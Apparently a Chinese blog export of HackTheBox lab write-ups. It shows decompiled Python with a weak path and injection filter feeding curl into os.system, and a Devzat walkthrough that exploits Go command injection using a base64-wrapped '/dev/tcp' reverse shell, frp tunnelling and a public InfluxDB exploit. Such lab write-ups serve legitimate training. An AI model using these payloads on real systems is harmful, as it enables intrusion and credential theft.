<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: treport.pyc (Python 3.9)</span></span><br><span class="line"></span><br><span class="line">Unsupported opcode: &lt;<span class="number">255</span>&gt;</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threat_report</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">self</span>):</span></span><br><span class="line">Unsupported opcode: &lt;<span class="number">255</span>&gt;</span><br><span class="line">        file_name = <span class="built_in">input</span>(<span class="string">&#x27;Enter the filename:&#x27;</span>)</span><br><span class="line">        content = <span class="built_in">input</span>(<span class="string">&#x27;Enter the report:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../&#x27;</span> <span class="keyword">in</span> file_name:</span><br><span class="line">            print(<span class="string">&#x27;NOT ALLOWED&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        file_path = <span class="string">&#x27;/root/reports/&#x27;</span> + file_name</span><br><span class="line">    <span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_files</span>(<span class="params">self</span>):</span></span><br><span class="line">        file_list = os.listdir(<span class="string">&#x27;/root/reports/&#x27;</span>)</span><br><span class="line">        files_in_dir = <span class="string">&#x27; &#x27;</span>.join((<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">str</span>(elem) <span class="keyword">for</span> elem <span class="keyword">in</span> <span class="number">.0</span> ])(file_list))</span><br><span class="line">        print(<span class="string">&#x27;ALL THE THREAT REPORTS:&#x27;</span>)</span><br><span class="line">        print(files_in_dir)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">self</span>):</span></span><br><span class="line">Unsupported opcode: &lt;<span class="number">255</span>&gt;</span><br><span class="line">        file_name = <span class="built_in">input</span>(<span class="string">&#x27;\nEnter the filename:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../&#x27;</span> <span class="keyword">in</span> file_name:</span><br><span class="line">            print(<span class="string">&#x27;NOT ALLOWED&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        contents = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        file_name = <span class="string">&#x27;/root/reports/&#x27;</span> + file_name</span><br><span class="line">    <span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">self</span>):</span></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        current_time = now.strftime(<span class="string">&#x27;%H_%M_%S&#x27;</span>)</span><br><span class="line">        command_injection_list = [</span><br><span class="line">            <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;|&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;||&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;)&#x27;</span>]</span><br><span class="line">        ip = <span class="built_in">input</span>(<span class="string">&#x27;Enter the IP/file_name:&#x27;</span>)</span><br><span class="line">        res = <span class="built_in">bool</span>(re.search(<span class="string">&#x27;\\s&#x27;</span>, ip))</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            print(<span class="string">&#x27;INVALID IP&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> ip <span class="keyword">and</span> <span class="string">&#x27;gopher&#x27;</span> <span class="keyword">in</span> ip <span class="keyword">or</span> <span class="string">&#x27;mysql&#x27;</span> <span class="keyword">in</span> ip:</span><br><span class="line">            print(<span class="string">&#x27;INVALID URL&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        cmd = <span class="string">&#x27;/bin/bash -c &quot;curl &#x27;</span> + ip + <span class="string">&#x27; -o /root/reports/threat_report_&#x27;</span> + current_time + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">        os.system(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/e74f33ca978844968ee75dd4938f38b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>本地文件读取</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Devzat</title>
    <url>/2022/01/31/Devzat/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>目标主机开放了web服务、ssh服务和另外一个在8000端口开放的ssh服务<br><img src="https://img-blog.csdnimg.cn/21b6d282e8da4c69b98366ce01e46824.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试连接8000端口的ssh服务，发现是一个聊天窗口<br><img src="https://img-blog.csdnimg.cn/84313fe1057f44c28891d502ea10fcc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>查看完可执行的命令后，还是没有新的发现<br><img src="https://img-blog.csdnimg.cn/c177659919d14648a3242a3318b51298.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>访问web服务时，发现只是一个普通的推销网站而已，并且扫描目录文件时也没有发现有价值的信息<br><img src="https://img-blog.csdnimg.cn/09ad4566419a4b90b458ab4f5f54788e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://devzat.htb/&quot;</span> -e * -x404,403,500 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0551196c84a14524bac03c2c69952c82.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>既然没有有价值的信息，那么我们就得切换思路了，我们得尝试扫描是否存在子域名，存在一个pets子域</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -u <span class="string">&quot;http://devzat.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26 -H <span class="string">&quot;HOST:FUZZ.devzat.htb&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/a70274adbfa948bcab7740d140f6fe6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问子域网站的页面，发现是一个添加宠物姓名的一个功能站点<br><img src="https://img-blog.csdnimg.cn/73950ecdc3994db6b934d94aa67e3f72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们对这个url路径进行目录扫描，发现了一个git源码泄露</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://pets.devzat.htb&quot;</span> -e * -x404,403,500 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/70fc1cc7625040a2bcde7d064b309483.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问目录时，我们发现存在以下目录。我们使用GitTools工具还原源码数据<br><img src="https://img-blog.csdnimg.cn/cb028e4f2ddc4b189d580d34c06a58cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a5825b6e5ff54569803bb1b78576105d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e0022a2d30b943f0b4f8baaef52c3697.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>还原出源码之后，我们看到存在一个main.go文件，我们可以打开main.go文件审计源码看看是否存在漏洞<br><img src="https://img-blog.csdnimg.cn/c8a248995b4147deb28e8f0b50c74a47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们看到代码<code>cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species)</code>处存在一个命令注入，而且功能处是添加species种类处，我们可以利用这点执行恶意的代码。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;embed&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/fs&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static/public</span></span><br><span class="line"><span class="keyword">var</span> web embed.FS</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static/public/index.html</span></span><br><span class="line"><span class="keyword">var</span> index []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Pet <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name            <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Species         <span class="keyword">string</span> <span class="string">`json:&quot;species&quot;`</span></span><br><span class="line">	Characteristics <span class="keyword">string</span> <span class="string">`json:&quot;characteristics&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	Pets []Pet = []Pet&#123;</span><br><span class="line">		&#123;Name: <span class="string">&quot;Cookie&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Mia&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Chuck&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Balu&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Georg&quot;</span>, Species: <span class="string">&quot;gopher&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;gopher&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Gustav&quot;</span>, Species: <span class="string">&quot;giraffe&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;giraffe&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Rudi&quot;</span>, Species: <span class="string">&quot;redkite&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;redkite&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Bruno&quot;</span>, Species: <span class="string">&quot;bluewhale&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;bluewhale&quot;</span>)&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadCharacter</span><span class="params">(species <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat characteristics/&quot;</span>+species)</span><br><span class="line">	stdoutStderr, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err.Error()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">string</span>(stdoutStderr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getPets</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	json.NewEncoder(w).Encode(Pets)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addPet</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line">	<span class="keyword">var</span> addPet Pet</span><br><span class="line">	err := json.Unmarshal(reqBody, &amp;addPet)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		e := fmt.Sprintf(<span class="string">&quot;There has been an error: %+v&quot;</span>, err)</span><br><span class="line">		http.Error(w, e, http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addPet.Characteristics = loadCharacter(addPet.Species)</span><br><span class="line">	Pets = <span class="built_in">append</span>(Pets, addPet)</span><br><span class="line"></span><br><span class="line">	w.WriteHeader(http.StatusOK)</span><br><span class="line">	fmt.Fprint(w, <span class="string">&quot;Pet was added successfully&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleRequest</span><span class="params">()</span></span> &#123;</span><br><span class="line">	build, err := fs.Sub(web, <span class="string">&quot;static/public/build&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	css, err := fs.Sub(web, <span class="string">&quot;static/public/css&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	webfonts, err := fs.Sub(web, <span class="string">&quot;static/public/webfonts&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	spaHandler := http.HandlerFunc(spaHandlerFunc)</span><br><span class="line">	<span class="comment">// Single page application handler</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/&quot;</span>, headerMiddleware(spaHandler))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// All static folder handler</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/build/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/build&quot;</span>, http.FileServer(http.FS(build)))))</span><br><span class="line">	http.Handle(<span class="string">&quot;/css/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/css&quot;</span>, http.FileServer(http.FS(css)))))</span><br><span class="line">	http.Handle(<span class="string">&quot;/webfonts/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/webfonts&quot;</span>, http.FileServer(http.FS(webfonts)))))</span><br><span class="line">	http.Handle(<span class="string">&quot;/.git/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/.git&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;.git&quot;</span>)))))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// API routes</span></span><br><span class="line">	apiHandler := http.HandlerFunc(petHandler)</span><br><span class="line">	http.Handle(<span class="string">&quot;/api/pet&quot;</span>, headerMiddleware(apiHandler))</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:5000&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spaHandlerFunc</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	w.WriteHeader(http.StatusOK)</span><br><span class="line">	w.Write(index)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">petHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">// Dispatch by method</span></span><br><span class="line">	<span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">		addPet(w, r)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> r.Method == http.MethodGet &#123;</span><br><span class="line">		getPets(w, r)</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add Update and Delete</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">headerMiddleware</span><span class="params">(next http.Handler)</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		w.Header().Add(<span class="string">&quot;Server&quot;</span>, <span class="string">&quot;My genious go pet server&quot;</span>)</span><br><span class="line">		next.ServeHTTP(w, r)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	resetTicker := time.NewTicker(<span class="number">5</span> * time.Second)</span><br><span class="line">	done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">select</span> &#123;</span><br><span class="line">			<span class="keyword">case</span> &lt;-done:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="keyword">case</span> &lt;-resetTicker.C:</span><br><span class="line">				<span class="comment">// Reset Pets to prestaged ones</span></span><br><span class="line">				Pets = []Pet&#123;</span><br><span class="line">					&#123;Name: <span class="string">&quot;Cookie&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Mia&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Chuck&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Balu&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Georg&quot;</span>, Species: <span class="string">&quot;gopher&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;gopher&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Gustav&quot;</span>, Species: <span class="string">&quot;giraffe&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;giraffe&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Rudi&quot;</span>, Species: <span class="string">&quot;redkite&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;redkite&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Bruno&quot;</span>, Species: <span class="string">&quot;bluewhale&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;bluewhale&quot;</span>)&#125;,</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	handleRequest()</span><br><span class="line"></span><br><span class="line">	time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">	resetTicker.Stop()</span><br><span class="line">	done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>为了检测我们的代码可以成功运行，我们可以先使用ping命令检测是否能ping通我们本地的机器，抓包工具选择tcpdump较为方便<br><img src="https://img-blog.csdnimg.cn/6e33b2b67b2f4a719b747c1cd9ac9c6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7c8fd2469cb14d8d9e75f60d9188bfca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>返回的结果是成功执行了命令，那么我们可以将我们的恶意代码进行base64编码，目的是为了确保命令执行时不会出现渲染问题。payload的设置是：先将编码的字符串进行解码，解码之后传给管道符以bash命令运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.44/4444 0&gt;&amp;1&#x27;</span> | base64</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ccb0abeb9681491f9ac925d4249f715a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9ba6d6ecae5746bba902f3b7f0b88eb6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>反弹shell到本地机器上<br><img src="https://img-blog.csdnimg.cn/22566d53b80f46d79d780b9871c10674.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权到catherine"><a href="#提权到catherine" class="headerlink" title="提权到catherine"></a>提权到catherine</h2><p>拿到shell后，发现我们并没有权限查看user.txt文件的权限，并且home目录下存在另一个账户<code>catherine</code>。初步判断应该是要提权到这个用户权限上。我们使用万能提权脚本<code>linpeas.sh</code>上传到目标机器上运行，发现目标机器上以root权限运行着一个docker代理程序，并且运行的端口为8086<br><img src="https://img-blog.csdnimg.cn/7af7e79e6cb54a40b1dc0c7b52e9be19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因为目标机器的8086端口对外网不开放，所以我们必须使用内网穿透工具，利用端口转发技术将8086端口转发到我们的VPS机器上进行访问，所使用的工具是frp。我们先上传客户端到目标机器上，并在本机上运行服务端<br><img src="https://img-blog.csdnimg.cn/a16b934148f34fa8a7b8a708f2178fea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>客户端配置信息，server_addr是本机地址，server_port不用更改，local_port是要转发到本地机器的端口，remote_port是要被转发的机器的目标端口<br><img src="https://img-blog.csdnimg.cn/df2fddfbe7544441b83fd61835a4b155.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>穿透代理搭建成功后，我们可以扫描本地机子的8086端口，了解到开放的是<code>InfluxDB</code>服务<br><img src="https://img-blog.csdnimg.cn/3ca9e0134de24babb975067b86a49651.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在EDB上尝试过很多的exp，但是都没有成功。但是在github上发现了一个披露了的exp，经过验证发现可以利用成功，链接地址为<a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a><br><img src="https://img-blog.csdnimg.cn/3f3e1f4fbd72404f823d75c83181d7fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现了两个数据库，一个数据表，并查询数据表的信息，发现了<code>catherine</code>用户名的密码<br><img src="https://img-blog.csdnimg.cn/350fb64176ea4290b7efdb38a6d9e844.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/db24633ea9ea427fa1d00fcdf845252b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9dbe54a67fd7458c9132ff68b0285457.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么就获取到了user.txt文件的权限了<br><img src="https://img-blog.csdnimg.cn/32ae8ee62ba2425a94b71552d0a6f221.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
